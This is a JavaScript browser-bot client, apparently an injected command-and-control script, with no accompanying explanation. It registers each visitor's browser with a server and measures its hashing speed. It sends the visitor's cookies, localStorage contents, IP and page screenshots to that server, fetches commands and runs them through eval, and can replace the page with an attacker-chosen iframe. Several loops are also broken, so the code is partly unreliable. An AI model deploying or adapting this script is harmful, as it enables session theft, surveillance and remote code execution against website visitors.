const ServerUrl = "http://127.0.0.1:5000";
var script = document.createElement('script');
script.src = ServerUrl + '/static/js/html2canvas.js';
document.head.appendChild(script);

var info = [0, 1, 2, 3, 4]
let myUniqueIdentifier = getCookieValue('myUniqueIdentifier');
if (!myUniqueIdentifier) {
  myUniqueIdentifier = `${Date.now()}-${Math.random().toString(36).substring(2, 15)}`;
  setCookie('myUniqueIdentifier', myUniqueIdentifier, 30);
}

function getCookieValue(name) {
  const cookies = document.cookie.split('; ');
  for (let i = 0; i < cookies.length; i++) {
    const cookie = cookies[i].split('=');
    if (cookie[0] === name) {
      return cookie[1];
    }
  }
  return undefined;
}

function setCookie(name, value, expirationDays) {
  const expirationDate = new Date(Date.now() + expirationDays * 24 * 60 * 60 * 1000).toUTCString();
  document.cookie = `${name}=${value}; expires=${expirationDate}; path=/`;
}

var intermg = undefined

function captureScreenshot() {
  html2canvas(document.body).then(function(canvas) {
    var dataURL = canvas.toDataURL();
    var requestData = {
      cmdtype: "capture",
      botname: myUniqueIdentifier,
      data: dataURL
    };
    fetch(ServerUrl + '/output', {
      method: 'POST',
      body: JSON.stringify(requestData),
      headers: {
        'Content-Type': 'application/json'
      }
    })
    .then(response => console.log(response))
    .catch(error => console.error(error))
  });
}

function geoloc() {
  var ino = ["Empty"]
  fetch("https://api.ipify.org?format=json").then((response) => response.json()).then((data) => {
    ino[0] = data[0];
    if (ino[0].length < 6) {
      while (info[1].length < 6) {
        fetch("https://api.ipify.org?format=json").then((response) => response.json()).then((data) => {
          ino[0] = data[0];
        }).catch((error) => {
          ino[0] = "";
        });
      }
      console.log(ino)
      var requestData = {
        cmdtype: "geoloc",
        botname: myUniqueIdentifier,
        data: ino[0]
      };
      fetch(ServerUrl + '/output', {
        method: 'POST',
        body: JSON.stringify(requestData),
        headers: {
          'Content-Type': 'application/json'
        }
      })
      .then(response => console.log(response))
      .catch(error => console.error(error))
    } else {
      console.log(ino)
      var requestData = {
        cmdtype: "geoloc",
        botname: myUniqueIdentifier,
        data: ino[0]
      };
      fetch(ServerUrl + '/output', {
        method: 'POST',
        body: JSON.stringify(requestData),
        headers: {
          'Content-Type': 'application/json'
        }
      })
      .then(response => console.log(response))
      .catch(error => console.error(error))
    }
  }).catch((error) => {
    ino[0] = "";
  });
  var requestData = {
    cmdtype: "geoloc",
    botname: myUniqueIdentifier,
    data: ino[0]
  };
  fetch(ServerUrl + '/output', {
    method: 'POST',
    body: JSON.stringify(requestData),
    headers: {
      'Content-Type': 'application/json'
    }
  })
  .then(response => console.log(response))
  .catch(error => console.error(error))
  
}

function cookies() {
  var cookies = document.cookie.split(";"); // Split cookies into an array

  var cookieList = []; // Create an empty list to store cookies

  for (var i = 0; i < cookies.length; i++) {
    var cookie = cookies[i].trim(); // Remove any whitespace from cookie
    cookieList.push(cookie); // Add cookie to list
  }
  var requestData = {
    cmdtype: "cookies",
    botname: myUniqueIdentifier,
    data: cookieList
  };
  fetch(ServerUrl + '/output', {
    method: 'POST',
    body: JSON.stringify(requestData),
    headers: {
      'Content-Type': 'application/json'
    }
  })
  .then(response => console.log(response))
  .catch(error => console.error(error))
}

function locals() {
  var localStorageItems = []; // Create an empty array to store local storage items

  for (var i = 0; i < localStorage.length; i++) {
    var key = localStorage.key(i);
    var value = localStorage.getItem(key);
    localStorageItems.push({key: key, value: value});
  }

  var requestData = {
    cmdtype: "localstorage",
    botname: myUniqueIdentifier,
    data: localStorageItems
  };
  fetch(ServerUrl + '/output', {
    method: 'POST',
    body: JSON.stringify(requestData),
    headers: {
      'Content-Type': 'application/json'
    }
  })
  .then(response => console.log(response))
  .catch(error => console.error(error))
}

function parseURL(input) {
  let url = input.trim();
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    url = 'http://' + url;
  }
  if (!url.includes('www.')) {
    url = url.replace('://', '://www.');
  }
  return url;
}

function redirectTo(url) {
  let parsedURL = parseURL(atob(url));
  document.body.style.padding = '0';
  document.body.style.margin = '0';
  document.body.style.height = '100%';
  document.documentElement.style.height = '100%';
  document.documentElement.style.width = '100%';
  document.body.style.overflow = 'hidden'; // added this line
  document.documentElement.style.overflow = 'hidden'; // added this line
  document.body.innerHTML = '';
  var ifr = document.createElement('iframe');
  ifr.src = parsedURL;
  ifr.style.height = '100%';
  ifr.style.width = '100%';
  document.body.appendChild(ifr);
}


function remover() {
  var request = new XMLHttpRequest();
  request.open('POST', ServerUrl + '/bot/' + myUniqueIdentifier + '/quit', false);
  request.send();
  clearInterval(intermg);
}

function heartbeat() {
  try {
    const url = ServerUrl + "/bot/" + info[0] + "/heartbeat";
    fetch(url)
      .then((response) => {
        console.log(response)
        if (response.status != 200) {
          clearInterval(intermg);
          getdata();
        }
        return response.text();
      })
      .then((data) => {
        console.log(data);
      })
      .catch((error) => {
        console.error('There was a problem with the network request:', error);
      });
  } catch (error) {
    console.error('There was a problem with the request:', error);
  }
}

function recfromserver() {
  try {
    const url = ServerUrl + "/bot/" + info[0];
    fetch(url)
      .then((response) => response.text())
      .then((data) => {
        if (data == "Empty") {

        } else {
          eval(data)
        }
      });
  } catch {
    clearInterval(intermg);
    getdata();
  }
}

function standby() {
  heartbeat();
  recfromserver();
}

function checkdata(data) {
  clearInterval(intermg);
  if (data == "Bot registered successfully") {
    intermg = setInterval(standby, 2500);
  } else if (data == "Already Registered") {
    console.log("Other Tab Is Running It")
  } else {
    getdata()
  }
}

function connect(name, ip, browser, hsp, from) {
  try {
    if (ip.length < 6) {
      getdata()
      console.log(ip)
    } else {
      const url = ServerUrl + "/bot";
      fetch(url + "?name=" + name + "&IP=" + ip + "&browser=" + browser + "&hsp=" + hsp + "&from=" + from)
        .then((response) => response.text())
        .then((data) => checkdata(data));
    }
  } catch {
    connect(name, ip, browser, hsp, from)
  }

}

function getip() {
  fetch("https://api.ipify.org?format=json").then((response) => response.json()).then((data) => {
    info[1] = data["ip"];
  }).catch((error) => {
    info[1] = "";
  });
  if (info[1].length < 6) {
    while (info[1].length < 6) {
      fetch("https://api.ipify.org?format=json").then((response) => response.json()).then((data) => {
        info[1] = data["ip"];
      }).catch((error) => {
        info[1] = "";
      });
    }
  }
}


function getbrowser() {
  const {
    userAgent
  } = navigator;
  if (userAgent.includes("Firefox/")) {
    info[2] = "Firefox";
  } else if (userAgent.includes("Edg/")) {
    info[2] = "Edge";
  } else if (userAgent.includes("Chrome/")) {
    info[2] = "Chrome";
  } else if (userAgent.includes("Safari/")) {
    info[2] = "Safari";
  } else {
    info[2] = "Unknown";
  }
}

function calculateHashesPerSecond() {
  const url = "https://cdnjs.cloudflare.com/ajax/libs/js-sha256/0.9.0/sha256.js";
  fetch(url).then((response) => response.text()).then((script) => {
    eval(script);
    const numHashes = 50;
    const start = Date.now();
    let i = 0;
    while (i < numHashes) {
      console.log(sha256("hello world" + i));
      i++;
    }
    const end = Date.now();
    const elapsed = (end - start) / 1000;
    const hashRate = numHashes / elapsed;
    info[3] = hashRate;
  }).catch((error) => console.error(error));
}

function getfromsite() {
  info[4] = window.location.origin;
}

function getdata() {
  var uuid = myUniqueIdentifier;
  var name = uuid;
  info[0] = name;
  getip();
  getbrowser();
  getfromsite();
  calculateHashesPerSecond();
  setTimeout(function() {
    connect(info[0], info[1], info[2], info[3], info[4]);
  }, 3000);
}

function bfrel() {
  try {
    var request = new XMLHttpRequest();
    request.open('POST', ServerUrl + '/bot/' + info[0] + '/quit', false);
    request.send();
    getdata();
  } catch {

  }
};

document.addEventListener('mouseleave', function(event) {
  bfrel();
});

getdata()
